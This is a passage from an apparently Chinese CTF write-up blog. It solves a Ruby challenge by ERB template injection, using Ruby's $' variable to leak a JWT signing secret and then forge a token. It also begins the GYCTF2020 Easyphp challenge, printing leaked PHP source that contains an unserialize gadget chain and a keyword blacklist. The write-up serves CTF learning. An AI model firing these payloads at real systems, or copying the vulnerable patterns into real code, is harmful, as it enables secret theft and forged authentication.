class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p>唉，我都不知道这是什么语言写的。看了其它师傅的题解才知道这东西叫<code>ruby</code>。</p><p>首先关注和<code>JWT</code>生成有关的路由：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs ruby">get <span class="hljs-string">&quot;/api/auth&quot;</span> <span class="hljs-keyword">do</span><br>  payload = &#123; <span class="hljs-symbol">uid:</span> <span class="hljs-title class_">SecureRandom</span>.uuid, <span class="hljs-symbol">jkl:</span> <span class="hljs-number">20</span> &#125;<br>  auth = <span class="hljs-variable constant_">JWT</span>.encode payload, <span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>], <span class="hljs-string">&#x27;HS256&#x27;</span><br>  cookies[<span class="hljs-symbol">:auth</span>] = auth<br><span class="hljs-keyword">end</span><br>get <span class="hljs-string">&quot;/api/info&quot;</span> <span class="hljs-keyword">do</span><br>  islogin<br>  auth = <span class="hljs-variable constant_">JWT</span>.decode cookies[<span class="hljs-symbol">:auth</span>], <span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>], <span class="hljs-literal">true</span>, &#123; <span class="hljs-symbol">algorithm:</span> <span class="hljs-string">&#x27;HS256&#x27;</span> &#125;<br>  json(&#123; <span class="hljs-symbol">uid:</span> auth[<span class="hljs-number">0</span>][<span class="hljs-string">&quot;uid&quot;</span>], <span class="hljs-symbol">jkl:</span> auth[<span class="hljs-number">0</span>][<span class="hljs-string">&quot;jkl&quot;</span>] &#125;)<br><span class="hljs-keyword">end</span><br><br><br></code></pre></td></tr></table></figure><p><code>auth</code>这个路由使用<code>ENV[&quot;SECRET&quot;]</code>对存有<code>uuid</code>和<code>jkl</code>的哈希表进行JWT编码，编码完了赋值给<code>cookie</code>中的<code>auth</code>字段。<code>info</code>这个路由就是对<code>auth</code>字段进行解码。目标是获得这个<code>ENV[&quot;SECRET&quot;]</code>。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs ruby">get <span class="hljs-string">&quot;/work&quot;</span> <span class="hljs-keyword">do</span><br>  islogin<br>  auth = <span class="hljs-variable constant_">JWT</span>.decode cookies[<span class="hljs-symbol">:auth</span>],<span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-literal">true</span>, &#123; <span class="hljs-symbol">algorithm:</span> <span class="hljs-string">&#x27;HS256&#x27;</span> &#125;<br>  auth = auth[<span class="hljs-number">0</span>]<br>  <span class="hljs-keyword">unless</span> params[<span class="hljs-symbol">:SECRET</span>].<span class="hljs-literal">nil</span>?<br>    <span class="hljs-keyword">if</span> <span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>].match(<span class="hljs-string">&quot;<span class="hljs-subst">#&#123;params[<span class="hljs-symbol">:SECRET</span>].match(<span class="hljs-regexp">/[0-9a-z]+/</span>)&#125;</span>&quot;</span>)<br>      puts <span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;FLAG&quot;</span>]<br>    <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">if</span> params[<span class="hljs-symbol">:do</span>] == <span class="hljs-string">&quot;<span class="hljs-subst">#&#123;params[<span class="hljs-symbol">:name</span>][<span class="hljs-number">0</span>,<span class="hljs-number">7</span>]&#125;</span> is working&quot;</span> <span class="hljs-keyword">then</span><br><br>    auth[<span class="hljs-string">&quot;jkl&quot;</span>] = auth[<span class="hljs-string">&quot;jkl&quot;</span>].to_i + <span class="hljs-title class_">SecureRandom</span>.random_number(<span class="hljs-number">10</span>)<br>    auth = <span class="hljs-variable constant_">JWT</span>.encode auth,<span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-string">&#x27;HS256&#x27;</span><br>    cookies[<span class="hljs-symbol">:auth</span>] = auth<br>    <span class="hljs-variable constant_">ERB</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:new</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;<span class="hljs-subst">#&#123;params[<span class="hljs-symbol">:name</span>][<span class="hljs-number">0</span>,<span class="hljs-number">7</span>]&#125;</span> working successfully!&#x27;)&lt;/script&gt;&quot;</span>).result<br><br>  <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p>上面那部分就是验证<code>SECRET</code>和环境变量<code>SECRET</code>是否相等，相等就把环境变量<code>FLAG</code>的值给输出。接下来会检查参数<code>do</code>和<code>name[0，7] si working</code>是否匹配(name的前七个字符)。匹配的话会输出<code>&#123;params[:name][0,7]&#125; working successfully!</code></p><p>参考：<a href="https://www.sys71m.top/2018/08/03/Ruby_ERB%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/#%E6%A8%A1%E6%9D%BF%E6%A0%BC%E5%BC%8F">ERB模板注入</a></p><p>不过文章里用的<code>&lt;%= payload %&gt;</code>这种格式。。只截取七个字符好像不够用。。这里要用到<code>预定义变量$&#39;</code>：这东西表示最后一次匹配成功的字符串后面的字符串</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs ruby">str = <span class="hljs-string">&quot;Hello, Ruby!&quot;</span><br><span class="hljs-keyword">if</span> str =~ <span class="hljs-regexp">/Ruby/</span><br>  puts <span class="hljs-string">&quot;匹配成功&quot;</span><br>  puts <span class="hljs-string">&quot;匹配成功后的字符串: <span class="hljs-subst">#&#123;<span class="hljs-variable">$&#x27;</span>&#125;</span>&quot;</span><br><span class="hljs-keyword">else</span><br>  puts <span class="hljs-string">&quot;匹配失败&quot;</span><br><span class="hljs-keyword">end</span><br>结果：<br>匹配成功<br>匹配成功后的字符串: !<br></code></pre></td></tr></table></figure><p>然后利用这部分：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><br><span class="hljs-keyword">if</span> <span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>].match(<span class="hljs-string">&quot;<span class="hljs-subst">#&#123;params[<span class="hljs-symbol">:SECRET</span>].match(<span class="hljs-regexp">/[0-9a-z]+/</span>)&#125;</span>&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>我们直接令<code>secret</code>为空(这里匹配的时候啥也没匹配到)，此时<code>$&#39;</code>这东西就直接代表了<code>secret</code>的值~</p><p>所以传参：<code>/work?name=&lt;%=$&#39;%&gt;&amp;do=&lt;%=$&#39;%&gt; is working&amp;SECRET=</code>，注意这里<code>URL</code>编码一下：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">/work?name<span class="hljs-operator">=</span><span class="hljs-variable">%3</span><span class="hljs-keyword">c</span><span class="hljs-variable">%25</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%24</span><span class="hljs-variable">%27</span><span class="hljs-variable">%25</span><span class="hljs-variable">%3</span>e&amp;do<span class="hljs-operator">=</span><span class="hljs-variable">%3</span><span class="hljs-keyword">c</span><span class="hljs-variable">%25</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%24</span><span class="hljs-variable">%27</span><span class="hljs-variable">%25</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%20</span>is<span class="hljs-variable">%20</span>working&amp;SECRET<span class="hljs-operator">=</span><br></code></pre></td></tr></table></figure><p>得到<code>secret</code>:</p><p><img src="/img/flagshopwhatcookie1.png" alt="flagshopwhatcookie1"></p><p><code>c83b042eef124e41620715001e18a0a18bbb1d2ff64511500c41c473dee525d6c3ba5df2d36116bf8869341e41094a2c4e4c350bb3af31d1c337d6089cbdefd6</code></p><p>然后在上面哪个网站加密就行，注意把<code>jkl</code>字段的值设置成大点的(比如1e+27这种)，</p><p><img src="/img/flagshopwhat2.png" alt="flagshopwhat2"></p><p>然后注意这段代码：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ruby">auth &lt;&lt; &#123;<span class="hljs-symbol">flag:</span> <span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;FLAG&quot;</span>]&#125;<br>    auth = <span class="hljs-variable constant_">JWT</span>.encode auth,<span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-string">&#x27;HS256&#x27;</span><br>    cookies[<span class="hljs-symbol">:auth</span>] = auth<br>    json(&#123;<span class="hljs-symbol">title:</span> <span class="hljs-string">&quot;success&quot;</span>,<span class="hljs-symbol">message:</span> <span class="hljs-string">&quot;jkl is good thing&quot;</span>&#125;)<br>  <span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p><code>auth &lt;&lt; &#123;flag: ENV[&quot;FLAG&quot;]&#125;</code>：在 <code>auth</code> 变量中追加一个包含环境变量 <code>&quot;FLAG&quot;</code> 的哈希表。这可能是为了将一些标志或敏感信息添加到认证中。</p><p>把这时的<code>auth</code>字段再解一下：</p><p><img src="/img/flagshopwhat3.png" alt="flagshopwhat3"></p><h2 id="GYCTF2020-Easyphp"><a href="#GYCTF2020-Easyphp" class="headerlink" title="[GYCTF2020]Easyphp"></a>[GYCTF2020]Easyphp</h2><p>唉，反序列化</p><p><img src="/img/gshenmectfezphp1.png" alt="gshenmectfezphp1"></p><p><code>www.zip</code>泄露：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//index.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&quot;lib.php&quot;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>]))&#123;<br><span class="hljs-keyword">require_once</span>(<span class="hljs-keyword">__DIR__</span>.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>].<span class="hljs-string">&quot;.php&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>]==<span class="hljs-number">1</span>)&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;window.location.href=&#x27;./index.php?action=update&#x27;&lt;/script&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;window.location.href=&#x27;./index.php?action=login&#x27;&lt;/script&gt;&quot;</span>;<br>&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//lib.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">safe</span>(<span class="hljs-params"><span class="hljs-variable">$parm</span></span>)</span>&#123;<br>    <span class="hljs-variable">$array</span>= <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;union&#x27;</span>,<span class="hljs-string">&#x27;regexp&#x27;</span>,<span class="hljs-string">&#x27;load&#x27;</span>,<span class="hljs-string">&#x27;into&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;file&#x27;</span>,<span class="hljs-string">&#x27;insert&#x27;</span>,<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&quot;*&quot;</span>,<span class="hljs-string">&quot;alter&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$array</span>,<span class="hljs-string">&#x27;hacker&#x27;</span>,<span class="hljs-variable">$parm</span>);<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$id</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span>=<span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$nickname</span>=<span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$mysqli</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">dbCtrl</span>();<br>        <span class="hljs-variable language_">$this</span>-&gt;id=<span class="hljs-variable">$mysqli</span>-&gt;<span class="hljs-title function_ invoke__">login</span>(<span class="hljs-string">&#x27;select id,password from user where username=?&#x27;</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;id)&#123;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>]=<span class="hljs-variable language_">$this</span>-&gt;id;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>]=<span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;你的ID是&quot;</span>.<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;你好！&quot;</span>.<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;token&#x27;</span>];<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;window.location.href=&#x27;./update.php&#x27;&lt;/script&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;id;<br>        &#125;<br>    &#125;<br>&#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$Info</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">getNewinfo</span>());<br>        <span class="hljs-variable">$age</span>=<span class="hljs-variable">$Info</span>-&gt;age;<br>        <span class="hljs-variable">$nickname</span>=<span class="hljs-variable">$Info</span>-&gt;nickname;<br>        <span class="hljs-variable">$updateAction</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">UpdateHelper</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>],<span class="hljs-variable">$Info</span>,<span class="hljs-string">&quot;update user SET age=<span class="hljs-subst">$age</span>,nickname=<span class="hljs-subst">$nickname</span> where id=&quot;</span>.<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<br>        <span class="hljs-comment">//这个功能还没有写完 先占坑</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getNewInfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$age</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;age&#x27;</span>];<br>        <span class="hljs-variable">$nickname</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>];<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">safe</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Info</span>(<span class="hljs-variable">$age</span>,<span class="hljs-variable">$nickname</span>)));<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;nickname);<span class="hljs-comment">//危</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;nickname-&gt;<span class="hljs-title function_ invoke__">update</span>(<span class="hljs-variable">$this</span>-&gt;age);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;0-0&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Info</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$nickname</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$CtrlCase</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$age</span>,<span class="hljs-variable">$nickname</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;age=<span class="hljs-variable">$age</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;nickname=<span class="hljs-variable">$nickname</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$argument</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;CtrlCase-&gt;<span class="hljs-title function_ invoke__">login</span>(<span class="hljs-variable">$argument</span>[<span class="hljs-number">0</span>]);<br>    &#125;<br>&#125;<br>Class UpdateHelper&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$id</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$newinfo</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$sql</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$newInfo</span>,<span class="hljs-variable">$sql</span></span>)</span>&#123;<br>        <span class="hljs-variable">$newInfo</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$newInfo</span>);<br>        <span class="hljs-variable">$upDate</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">dbCtrl</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;sql;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">dbCtrl</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$hostname</span>=<span class="hljs-string">&quot;127.0.0.1&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$dbuser</span>=<span class="hljs-string">&quot;root&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$dbpass</span>=<span class="hljs-string">&quot;root&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$database</span>=<span class="hljs-string">&quot;test&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$mysqli</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>        <span class="hljs-variable language_">$this</span>-&gt;password=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>        <span class="hljs-variable language_">$this</span>-&gt;token=<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;token&#x27;</span>];<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$sql</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;mysqli=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(<span class="hljs-variable">$this</span>-&gt;hostname, <span class="hljs-variable">$this</span>-&gt;dbuser, <span class="hljs-variable">$this</span>-&gt;dbpass, <span class="hljs-variable">$this</span>-&gt;database);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;mysqli-&gt;connect_error) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;连接失败，错误:&quot;</span> . <span class="hljs-variable language_">$this</span>-&gt;mysqli-&gt;connect_error);<br>        &#125;<br>        <span class="hljs-variable">$result</span>=<span class="hljs-variable language_">$this</span>-&gt;mysqli-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-variable">$sql</span>);<br>        <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">bind_param</span>(<span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-variable">$this</span>-&gt;name);<br>        <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>        <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">bind_result</span>(<span class="hljs-variable">$idResult</span>, <span class="hljs-variable">$passwordResult</span>);<br>        <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>();<br>        <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;token==<span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$idResult</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$idResult</span>) &#123;<br>            <span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;用户不存在!&#x27;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;password)!==<span class="hljs-variable">$passwordResult</span>) &#123;<br>            <span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;密码错误！&#x27;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;token&#x27;</span>]=<span class="hljs-variable language_">$this</span>-&gt;name;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$idResult</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params"><span class="hljs-variable">$sql</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">//还没来得及写</span><br>    &#125;<br>&#125;<br><span class="hljs-comment">//login.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;lib.php&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br>&lt;meta http-equiv=<span class="hljs-string">&quot;Content-Type&quot;</span> content=<span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span> /&gt; 